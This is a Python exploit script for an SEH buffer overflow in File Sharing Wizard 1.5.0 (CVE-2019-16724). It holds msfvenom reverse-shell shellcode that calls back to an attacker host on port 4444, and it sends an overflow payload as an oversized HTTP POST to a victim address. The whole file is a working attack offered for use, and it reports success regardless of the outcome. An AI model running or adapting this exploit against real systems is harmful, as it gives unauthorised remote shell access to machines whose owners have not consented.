
# Exploit Title : SEH Buffer Oveflow in File Sharing Wizard
# Date : 05/09/2020
# Exploit Author : GihanJ
# Target Application : file sharing wizard
# Version : 1.5.0
# Tested on : Windows 7
# Assigned CVE ID : CVE-2019-16724
# Keyword : File-sharing-wizard-seh

import socket

Victim_host = "192.168.8.102"
Victim_port = 80

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.8.103 LPORT=4444 -b "\x00\x20" -f python -v shellcode EXITFUNC=seh -a x86


shellcode =  ""
shellcode += "\xb8\xed\xbf\xe1\xa3\xd9\xe1\xd9\x74\x24\xf4\x5a"
shellcode += "\x33\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x2f"
shellcode += "\xbb\x03\x56\x53\x2c\x41\x99\xab\xad\x26\x13\x4e"
shellcode += "\x9c\x66\x47\x1b\x8f\x56\x03\x49\x3c\x1c\x41\x79"
shellcode += "\xb7\x50\x4e\x8e\x70\xde\xa8\xa1\x81\x73\x88\xa0"
shellcode += "\x01\x8e\xdd\x02\x3b\x41\x10\x43\x7c\xbc\xd9\x11"
shellcode += "\xd5\xca\x4c\x85\x52\x86\x4c\x2e\x28\x06\xd5\xd3"
shellcode += "\xf9\x29\xf4\x42\x71\x70\xd6\x65\x56\x08\x5f\x7d"
shellcode += "\xbb\x35\x29\xf6\x0f\xc1\xa8\xde\x41\x2a\x06\x1f"
shellcode += "\x6e\xd9\x56\x58\x49\x02\x2d\x90\xa9\xbf\x36\x67"
shellcode += "\xd3\x1b\xb2\x73\x73\xef\x64\x5f\x85\x3c\xf2\x14"
shellcode += "\x89\x89\x70\x72\x8e\x0c\x54\x09\xaa\x85\x5b\xdd"
shellcode += "\x3a\xdd\x7f\xf9\x67\x85\x1e\x58\xc2\x68\x1e\xba"
shellcode += "\xad\xd5\xba\xb1\x40\x01\xb7\x98\x0c\xe6\xfa\x22"
shellcode += "\xcd\x60\x8c\x51\xff\x2f\x26\xfd\xb3\xb8\xe0\xfa"
shellcode += "\xb4\x92\x55\x94\x4a\x1d\xa6\xbd\x88\x49\xf6\xd5"
shellcode += "\x39\xf2\x9d\x25\xc5\x27\x31\x75\x69\x98\xf2\x25"
shellcode += "\xc9\x48\x9b\x2f\xc6\xb7\xbb\x50\x0c\xd0\x56\xab"
shellcode += "\xc7\x1f\x0e\xbb\x70\xc8\x4d\xbb\x6f\x54\xdb\x5d"
shellcode += "\xe5\x74\x8d\xf6\x92\xed\x94\x8c\x03\xf1\x02\xe9"
shellcode += "\x04\x79\xa1\x0e\xca\x8a\xcc\x1c\xbb\x7a\x9b\x7e"
shellcode += "\x6a\x84\x31\x16\xf0\x17\xde\xe6\x7f\x04\x49\xb1"
shellcode += "\x28\xfa\x80\x57\xc5\xa5\x3a\x45\x14\x33\x04\xcd"
shellcode += "\xc3\x80\x8b\xcc\x86\xbd\xaf\xde\x5e\x3d\xf4\x8a"
shellcode += "\x0e\x68\xa2\x64\xe9\xc2\x04\xde\xa3\xb9\xce\xb6"
shellcode += "\x32\xf2\xd0\xc0\x3a\xdf\xa6\x2c\x8a\xb6\xfe\x53"
shellcode += "\x23\x5f\xf7\x2c\x59\xff\xf8\xe7\xd9\x01\x08\x35"
shellcode += "\xf4\x96\xb3\xac\xb5\xfa\x43\x1b\xf9\x02\xc0\xa9"
shellcode += "\x82\xf0\xd8\xd8\x87\xbd\x5e\x31\xfa\xae\x0a\x35"
shellcode += "\xa9\xcf\x1e"


shell= "\x90" * 100 + shellcode


payload  = "A" *1040 + "\xEB\x06\x90\x90" + "\x7f\xa6\x38\x7c" + shell + "B" *(5000-len(shell))


payload_header  = "POST " + payload
payload_header +=" HTTP/1.0\r\n\r\n"

try:
	print("""
                -----------------------------------------------------------
                File Sharing Wizard (V 1.5.0) SEH Overflow - CVE-2019-16724
                                Exploit By : GihanJ
                -----------------------------------------------------------
        """)
    	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("[_/] Setting up the Socket Connection")
	expl.connect((Victim_host, Victim_port))
	print("[_/] Establihed the Connection with the Target Host")
    	expl.send(payload_header)
	print("[_/] Sending the Exploit .... ")
	print("[_/] Exploitation Successfull !!! ")
except:
	print("[!] Error in Establishing the Connection, Please Check the Parameters")
	print("[!] Exploitation Failed !!! ")



